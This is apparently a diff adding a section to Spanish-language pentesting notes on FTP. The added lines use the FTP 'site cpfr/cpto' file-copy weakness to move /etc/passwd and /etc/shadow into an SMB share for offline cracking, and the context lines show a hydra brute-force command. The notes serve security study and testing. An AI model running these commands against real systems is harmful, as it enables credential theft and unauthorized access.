@@ -28,6 +28,23 @@ hydra -L /usr/share/wordlists/metasploit/unix_users.txt <usuario> -p password123
 wget -r ftp://"<user>":"<pass>"@ip
 ```
 
+### Vulnerabilidad File Copy
+En cierta version de FTP podemos copiar ficheros entre directorios de la máquina. Esto interesa cuando se combina con que tenemos un SMB y podemos acceder a los recursos compartidos.
+
+Podemos copiar los ficheros **passwd** y **shadow** al directorio del recurso compartido y descargarlo para crackearlo. El funcionamiento es el siguiente:
+
+```bash
+# Intentamos un login (aunque sea falso), dará error pero recibiremos un prompt
+
+ftp usuario@ip
+
+#Ahora hacemos la magia
+site cpfr /etc/passwd
+site cpto /home/aeolus/shared/passwd
+site cpfr /etc/shadow
+site cpto /home/aeolus/shared/shadow
+```
+
 
 
 
